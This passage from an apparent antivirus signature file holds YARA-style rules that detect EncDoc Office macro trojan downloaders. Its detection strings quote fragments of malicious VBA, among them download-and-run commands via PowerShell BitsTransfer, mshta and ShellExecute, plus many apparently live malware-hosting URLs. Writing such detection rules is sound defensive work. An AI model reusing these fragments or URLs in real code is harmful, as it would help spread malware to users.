        detection_name = "TrojanDownloader:O97M/EncDoc.PAJ!MTB"
        threat_id = "2147789000"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "nhxkhd__bits7,nb2(tuesday4(\"+w0vi485\"),\"vygqjy\")" ascii //weight: 1
        $x_1_2 = "generations8=api1&nb2(tuesday4(\"hq==\"),\"gqvomq\")&assumption1callbynameva2,strreverse(chr((11+99))&chr((116+1))&chr((115-33))),(1+0),generations8" ascii //weight: 1
        $x_1_3 = "callbynamealgorithm2,strreverse(chr(110)&chr(101)&chr(112)&chr(79)),(0+1),journalist4,,true,,,,,,,,,false" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_UBA_2147789018_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.UBA!MTB"
        threat_id = "2147789018"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hemmiop = dzzi & \"R\" & \"I\"" ascii //weight: 1
        $x_1_2 = "Sw = 4: Sheets(1).Cells(17, 1).FormulaLocal = hemmiop & daBB" ascii //weight: 1
        $x_1_3 = "daBB = \"T\" & swells & \"O\" & \"()\"" ascii //weight: 1
        $x_1_4 = "Sheets(1).[A5].FormulaLocal = qq" ascii //weight: 1
        $x_1_5 = "dzzi = \"c\": dzzi = \"=\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_UBB_2147789019_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.UBB!MTB"
        threat_id = "2147789019"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Excel4MacroSheets.Add Before:=Worksheets(1): ActiveSheet.Visible = xlSheetHidden" ascii //weight: 1
        $x_1_2 = "swells = h_testo & \"RN\"" ascii //weight: 1
        $x_1_3 = "nio = ko: Run (\"\" & \"A\" & 3)" ascii //weight: 1
        $x_1_4 = "soloUnio = Split(Tk, \"k\")" ascii //weight: 1
        $x_1_5 = "bico = (nikolL(dzzi & vi, 1 + jio)): piconos (112)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAK_2147789523_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAK!MTB"
        threat_id = "2147789523"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vb_name=\"feedbacking\"" ascii //weight: 1
        $x_1_2 = "i=lbound(lin,1)toubound(lin,1)test=test+ifie=split(lin(i),\"|\",3" ascii //weight: 1
        $x_1_3 = "processings(obj.responsetext)endifend" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAL_2147793663_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAL!MTB"
        threat_id = "2147793663"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "url=\"http://172.16.79.192/handson.bat\"const" ascii //weight: 1
        $x_1_2 = ",2'1=nooverwrite,2=overwriteostream.close'execute(hidewindow)shellfilepath,vbhideendifend" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAM_2147793904_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAM!MTB"
        threat_id = "2147793904"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vb_name=\"cnl\"functionljknmn" ascii //weight: 1
        $x_1_2 = "ljknmn=chr(ophji-130)vcxbdg" ascii //weight: 1
        $x_1_3 = ".run(nujvftidx," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAN_2147794129_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAN!MTB"
        threat_id = "2147794129"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "documents\\\"+\"tllsm4w2.txt\")thenifnotnbhx28yw.folderexists(nx9nfgpy)thennbhx28yw.createfolder(nx9nfgpy)qs=nx9nfgpy+\"\\helpcenterupdater.vbs" ascii //weight: 1
        $x_1_2 = "write\"rz0k2t3k=split(str,\"\"c2\"\",-1,0)\"&vb" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAO_2147794464_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAO!MTB"
        threat_id = "2147794464"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "open()reflectnews=\"powe^rs\"linechange=" ascii //weight: 1
        $x_1_2 = "citizengeneral.c\"&chr(109)&\"d\"elseheart=\"h^ell\"ordecide" ascii //weight: 1
        $x_1_3 = "onc:\\users\\public\\documents\\forwardor.e`xe\"&\";c:\\users\\public\\documents\\forwardor.e" ascii //weight: 1
        $x_1_4 = "(sheee&\"l.application\").open(linechange" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAP_2147794578_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAP!MTB"
        threat_id = "2147794578"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {76 62 5f 6e 61 6d 65 3d 22 03 03 03 02 6e 6d 71 6d 67 6b 7a 79}  //weight: 1, accuracy: Low
        $x_1_2 = "=0ncb=\"vbxcbbnvbcvczxcvxcbvxcb\"" ascii //weight: 1
        $x_1_3 = "&vbnghfg(221)&" ascii //weight: 1
        $x_1_4 = "chr(xcdsg-144)xcvbvxc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAP_2147794578_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAP!MTB"
        threat_id = "2147794578"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "x=strreverse(\"cne-1niw-exe.llehsrewop\\0.1v" ascii //weight: 1
        $x_1_2 = "x=x+\"st\"x=x+\"art\"x=x+\"/m\"+\"i\"+\"n\"prefix1=xend" ascii //weight: 1
        $x_1_3 = "d=shell(bat,0)ends" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAP_2147794578_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAP!MTB"
        threat_id = "2147794578"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vb_name=\"clean\"" ascii //weight: 1
        $x_1_2 = "mshta\"case2getenumname=\"http://www.bitly.com/doaksodksueasdweu\"ends" ascii //weight: 1
        $x_1_3 = "alc()setcalc=getobject(strreverse(\"000045355444-e94a-ec11-972c-02690731:wen\"))endf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_QBR_2147794636_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.QBR!MTB"
        threat_id = "2147794636"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"t\"&\"t\"&\"ps://maxdigitizing.com/wAbCNMUm/pp.h\"&\"t\"&\"ml\"" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"t\"&\"ps://turnipshop.com/ihiRzoi1/pp.h\"&\"tml\"" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"tps://dynamiclifts.co.in/1PWQQcv0D/pp.h\"&\"tml \"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_QBV_2147794782_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.QBV!MTB"
        threat_id = "2147794782"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"ttp\"&\"s://gillcart.com/Cdpmoyhr/key.x\"&\"m\"&\"l" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"tp\"&\"s://geit.in/MeOlE9Xxd/key.x\"&\"m\"&\"l" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"ps://mercanets.com/9DPZqAfZdq5z/key.x\"&\"m\"&\"l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDS_2147794862_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDS!MTB"
        threat_id = "2147794862"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "-w hi slee^p -Se 31;Sta^rt-BitsT^ransfer -Source htt`p://18.195.133.226/DD/E/IMG_501370000125.e`xe\"" ascii //weight: 1
        $x_1_2 = "-Destination C:\\Users\\Public\\Documents\\beatteam.e`xe\" &" ascii //weight: 1
        $x_1_3 = "CreateObject(sheee & \"l.application\").Open(reflectreason)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STL_2147794888_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STL!MTB"
        threat_id = "2147794888"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Dim a As New ScriptControl" ascii //weight: 1
        $x_1_2 = "a.Language = ActiveWorkbook.BuiltinDocumentProperties(\"Subject\").Value" ascii //weight: 1
        $x_1_3 = {61 2e 41 64 64 43 6f 64 65 20 28 41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 42 75 69 6c 74 69 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 43 6f 6d 6d 65 6e 74 73 22 29 2e 56 61 6c 75 65 29 [0-3] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALA_2147794984_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALA!MTB"
        threat_id = "2147794984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6c 6f 6e 67 [0-10] 63 6d 64 [0-10] 6d 73 67 62 6f 78 72 6d 73 68 74 61 [0-10] 68 74 74 70 73 77 77 77 62 69 74 6c 79 [0-10] 63 6f 6d 64 77 71 64 61 73 66 63 [0-10] 68 79 71 77 67 64 6a 6b 68 6b 61 73 [0-255] 73 68 65 6c 6c 65 78 65 63 75 74 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALA_2147794984_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALA!MTB"
        threat_id = "2147794984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "GetObject(adjaiwdjiaskd). _" ascii //weight: 1
        $x_1_2 = "Get(aksdokasodkoaksd). _" ascii //weight: 1
        $x_1_3 = {20 3d 20 22 43 3a [0-15] 72 6f 67 72 61 6d 44 61 74 61 [0-255] 22 20 2b 20 22 [0-255] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-255] 2c 20 22 [0-255] 22 2c 20 22 5c 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALA_2147794984_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALA!MTB"
        threat_id = "2147794984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "URL = \"https://cdn.sql.gg/6_aR_vb0hO_SaUnG7VhvwSkcAAutvXJA/SecurityHealthService.exe" ascii //weight: 1
        $x_1_2 = "myFile = \"_rage_exec.bat" ascii //weight: 1
        $x_1_3 = "Shell (\"_rage_exec.bat\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALA_2147794984_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALA!MTB"
        threat_id = "2147794984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"She\" + \"ll.Ap\" + \"plic\" + \"ation\")" ascii //weight: 1
        $x_1_2 = "CallByName(VFEhP, \"Sh\" + \"el\" + \"lExe\" + \"cute\", VbMethod," ascii //weight: 1
        $x_1_3 = "\"ping google.com;\" + eeeew" ascii //weight: 1
        $x_1_4 = "\"p\" + ifgkdfg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALA_2147794984_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALA!MTB"
        threat_id = "2147794984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "htt\"&\"ps:/\"&\"/surveillantfire.c\"&\"o\"&\"m/sFujOeiM0VB/alp.html" ascii //weight: 1
        $x_1_2 = "htt\"&\"ps:/\"&\"/artadidactica.ro/8dsjAbBmIJUu/alp.html" ascii //weight: 1
        $x_1_3 = "htt\"&\"ps:/\"&\"/sanbari.mx/MsP8e5Yxp/alp.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALA_2147794984_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALA!MTB"
        threat_id = "2147794984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"ping google.com;\" + eeeew" ascii //weight: 1
        $x_1_2 = "\"p\" + ifgkdfg" ascii //weight: 1
        $x_1_3 = {43 61 6c 6c 42 79 4e 61 6d 65 28 [0-255] 2c 20 [0-255] 2c 20 56 62 4d 65 74 68 6f 64 2c 20 [0-10] 28 30 29 2c 20 [0-10] 28 31 29 2c 20 [0-10] 28 32 29 2c 20 [0-10] 28 33 29 2c 20 [0-10] 28 34 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "KiALIW(DmoP5, DmoP6)" ascii //weight: 1
        $x_1_5 = "Range(\"H150\").Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALA_2147794984_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALA!MTB"
        threat_id = "2147794984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "If (char <> \" \") Then" ascii //weight: 1
        $x_1_2 = {43 61 6c 6c 42 79 4e 61 6d 65 28 [0-15] 2c 20 [0-15] 28 22 20 53 20 68 20 65 20 6c 20 6c 20 45 20 78 20 65 20 63 20 75 20 74 20 65 20 22 29 2c 20 56 62 4d 65 74 68 6f 64 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "\"ping google.com;\" + eeeew" ascii //weight: 1
        $x_1_4 = "\"p\" + ifgkdfg" ascii //weight: 1
        $x_1_5 = {6e 65 77 53 74 72 20 3d 20 6e 65 77 53 74 72 20 2b 20 4d 69 64 28 [0-15] 2c 20 69 2c 20 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALA_2147794984_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALA!MTB"
        threat_id = "2147794984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {62 69 74 6c 79 [0-255] 22 2b 22 73 64 62 67 6a 61 73 66 64 6a 61 73 68 66 68 61 73 66 64 61 22 [0-15] 3d 72 65 70 6c 61 63 65 28 [0-15] 2c 22 30 22 2c 22 2e 22 29 [0-15] 3d 72 65 70 6c 61 63 65}  //weight: 1, accuracy: Low
        $x_1_2 = "sub_auto_open_()sleeptestmsgbox_\"error!re-installoffice" ascii //weight: 1
        $x_1_3 = {67 65 74 6f 62 6a 65 63 74 28 [0-15] 29 2e 5f 67 65 74 28 [0-15] 29 2e 5f 63 72 65 61 74 65 5f 63 61 72 2c 5f 6e 75 6c 6c 2c 5f 6e 75 6c 6c 2c 5f 70 69 64 65 6e 64 73 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALA_2147794984_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALA!MTB"
        threat_id = "2147794984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"ping google.com;\" + Str" ascii //weight: 1
        $x_1_2 = "\"p\" + ActiveSheet.PageSetup.CenterFooter" ascii //weight: 1
        $x_1_3 = {43 61 6c 6c 42 79 4e 61 6d 65 28 [0-255] 2c 20 [0-255] 2c 20 56 62 4d 65 74 68 6f 64 2c 20 [0-10] 28 30 29 2c 20 [0-10] 28 31 29 2c 20 [0-10] 28 32 29 2c 20 [0-10] 28 33 29 2c 20 [0-10] 28 34 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Range(\"K\" & (25 + iMonthNum)).Value = income + 444.5" ascii //weight: 1
        $x_1_5 = "Set DvsQC = CreateObject(ActiveSheet.PageSetup.CenterHeader)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALA_2147794984_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALA!MTB"
        threat_id = "2147794984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set jvpgreIUGkjhgJGgfdhdsgddjgfvkbhcgcggg = CreateObject(\"microsoft.xmlhttp\")" ascii //weight: 1
        $x_1_2 = "Set bkjskbkjfdhtgrKHhjvheILhujkbjgvfhgfjkhbjxvjvhbfb = CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_3 = "xfjxgfcfogreGHJFCMVGCGFxcfxdxggfxdxnfxgfxngfghgv.Savetofile , fzghvzhwgrekljikhbkvfkzxvkvyyhvbkfrg, hvjgcfgjfvmHKVJjhbhblkjbvgklkkjhjhjkbkbhvmgre + hvjgcfgjfvmHKVJjhbhblkjbvgklkkjhjhjkbkbhvmgre" ascii //weight: 1
        $x_1_4 = "bkjskbkjfdhtgrKHhjvheILhujkbjgvfhgfjkhbjxvjvhbfb.Open (bkjskbkjfdhtgrKHhjvheILhujkbjgvfhgfjkhbjxvjvhbfb)" ascii //weight: 1
        $x_1_5 = "m974eabf21f = \"naiveremove" ascii //weight: 1
        $x_1_6 = "Bjhvhvh = \"fadziobfghgbke" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VLA_2147795134_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VLA!MTB"
        threat_id = "2147795134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell \"mshta https://bit.ly/asdqwdqwojdasmndbas\"" ascii //weight: 1
        $x_1_2 = "Sub askdjalsd()" ascii //weight: 1
        $x_1_3 = "VB_Base = \"0{00020819-0000-0000-C000-000000000046}" ascii //weight: 1
        $x_1_4 = "Private Sub Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VLA_2147795134_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VLA!MTB"
        threat_id = "2147795134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\windows\\system32\\calc\\..\\conhost.exe mshta http://j.mp/" ascii //weight: 1
        $x_1_2 = "asksddapoopbnnbnbtyqwkd" ascii //weight: 1
        $x_1_3 = "VBA.GetObject(\"new:13709620-C279-11CE-A49E-444553540000\").Shellexecute" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VLA_2147795134_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VLA!MTB"
        threat_id = "2147795134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"ttps://r\"&\"ecapitol.com/tl6ilKY1t8r/repo.h\"&\"tml" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"tps://s\"&\"weebez.com/QHaHeCnRrV/repo.h\"&\"tml" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"tps://m\"&\"hjlab.ml/2eie1JNsQB/repo.h\"&\"tml" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VLA_2147795134_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VLA!MTB"
        threat_id = "2147795134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
